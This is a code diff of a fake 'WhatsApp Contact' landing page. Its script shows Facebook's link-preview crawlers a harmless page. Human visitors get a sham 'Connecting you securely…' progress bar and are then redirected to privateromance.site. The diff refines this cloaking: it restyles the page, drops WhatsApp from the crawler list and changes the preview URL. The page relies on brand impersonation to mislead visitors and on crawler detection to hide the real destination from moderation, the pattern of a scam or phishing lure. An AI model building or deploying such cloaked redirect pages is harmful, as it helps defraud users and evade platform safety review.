@@ -4,20 +4,26 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>WhatsApp Contact – Tap to Chat</title>
+<title>WhatsApp Contact – Connecting</title>
 
 <!-- Open Graph -->
 <meta property="og:title" content="WhatsApp Contact">
 <meta property="og:description" content="Tap to chat on WhatsApp now">
 <meta property="og:image" content="https://kodean.online/assets/img/preview.jpg">
-<meta property="og:url" content="https://privateromance.site">
+<meta property="og:url" content="https://kodean.online/xuhulo">
 <meta property="og:type" content="website">
 
 <meta name="description" content="Tap to chat on WhatsApp now">
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial}
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
 body{
+  min-height:100vh;
   background:#0b141a;
   color:#fff;
   display:flex;
@@ -28,110 +34,105 @@ body{
   width:100%;
   max-width:420px;
   min-height:100vh;
-  background:linear-gradient(180deg,#111b21,#0b141a);
+  background:radial-gradient(circle at top,#1a2a33,#0b141a);
   display:flex;
   flex-direction:column;
 }
 .header{
   padding:14px 16px;
   display:flex;
-  gap:12px;
   align-items:center;
+  gap:12px;
   background:#111b21;
-  box-shadow:0 2px 8px rgba(0,0,0,.4);
 }
 .avatar{
-  width:44px;height:44px;border-radius:50%;object-fit:cover;
+  width:44px;
+  height:44px;
+  border-radius:50%;
+  object-fit:cover;
 }
-.name{font-weight:600}
-.status{font-size:13px;color:#25D366}
+.name{font-size:16px;font-weight:600}
+.status{
+  font-size:13px;
+  color:#25D366;
+  animation:pulse 1.6s infinite;
+}
+@keyframes pulse{
+  0%,100%{opacity:.6}
+  50%{opacity:1}
+}
 
 .content{
   flex:1;
-  padding:20px;
-  background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 60 60'%3E%3Cg fill='%23111b21' fill-opacity='0.4'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/svg%3E");
+  padding:26px 20px;
   text-align:center;
 }
-
 .big-avatar{
-  width:150px;height:150px;border-radius:50%;
-  margin:35px auto 15px;
-  box-shadow:0 0 35px rgba(37,211,102,.7);
-  animation:pulse 3s infinite;
+  width:160px;
+  height:160px;
+  border-radius:50%;
+  object-fit:cover;
+  margin:45px auto 18px;
+  box-shadow:0 0 35px rgba(37,211,102,.55);
+  animation:breath 3s ease-in-out infinite;
 }
-@keyframes pulse{
+@keyframes breath{
   0%,100%{transform:scale(1)}
   50%{transform:scale(1.05)}
 }
 
-.chat-bubble{
-  max-width:80%;
-  background:#202c33;
-  padding:14px 16px;
-  border-radius:16px;
-  margin:18px auto;
-  font-size:14px;
-  line-height:1.4;
-  position:relative;
-}
-.chat-bubble::after{
-  content:"";
-  position:absolute;
-  bottom:-6px;
-  left:20px;
-  width:12px;height:12px;
-  background:#202c33;
-  transform:rotate(45deg);
+.bio{
+  font-size:15px;
+  opacity:.85;
+  margin-bottom:22px;
 }
 
-.typing{
-  display:flex;
-  justify-content:center;
-  gap:6px;
-  margin-top:8px;
+.loader{
+  width:100%;
+  height:9px;
+  background:rgba(255,255,255,.15);
+  border-radius:20px;
+  overflow:hidden;
 }
-.typing span{
-  width:6px;height:6px;
-  background:#25D366;
-  border-radius:50%;
-  animation:blink 1.4s infinite both;
-}
-.typing span:nth-child(2){animation-delay:.2s}
-.typing span:nth-child(3){animation-delay:.4s}
-@keyframes blink{
-  0%{opacity:.2}
-  20%{opacity:1}
-  100%{opacity:.2}
-}
-
-.cta{
-  margin-top:28px;
-  padding:14px;
+.loader span{
+  display:block;
+  height:100%;
+  width:0%;
   background:linear-gradient(90deg,#25D366,#7CFFB2);
-  color:#000;
-  font-weight:600;
-  border-radius:30px;
-  box-shadow:0 0 25px rgba(37,211,102,.7);
 }
-.small{
-  font-size:12px;
+
+.loading-text{
+  margin-top:14px;
+  font-size:13px;
   opacity:.6;
-  margin-top:10px;
 }
 </style>
 
 <script>
+/* Landing + loader, redirect hanya untuk human */
 (function(){
   const ua = navigator.userAgent.toLowerCase();
   const isBot =
     ua.includes("facebookexternalhit") ||
-    ua.includes("facebot") ||
-    ua.includes("whatsapp");
+    ua.includes("facebot");
 
   if(!isBot){
-    setTimeout(()=>{
-      window.location.href = "https://privateromance.site";
-    }, 2200);
+    document.addEventListener("DOMContentLoaded",()=>{
+      const bar = document.getElementById("bar");
+      let w = 0;
+
+      const iv = setInterval(()=>{
+        w += 4;
+        bar.style.width = w + "%";
+
+        if(w >= 100){
+          clearInterval(iv);
+          setTimeout(()=>{
+            window.location.href = "https://privateromance.site";
+          }, 400);
+        }
+      }, 80);
+    });
   }
 })();
 </script>
@@ -149,16 +150,13 @@ body{
 
   <div class="content">
     <img src="https://kodean.online/assets/img/preview.jpg" class="big-avatar">
+    <div class="bio">Connecting you securely…</div>
 
-    <div class="chat-bubble">
-      Hey 👋 Tap below to chat with me on WhatsApp
-      <div class="typing">
-        <span></span><span></span><span></span>
-      </div>
+    <div class="loader">
+      <span id="bar"></span>
     </div>
 
-    <div class="cta">Tap to Chat</div>
-    <div class="small">Connecting securely…</div>
+    <div class="loading-text">Please wait</div>
   </div>
 </div>
 </body>
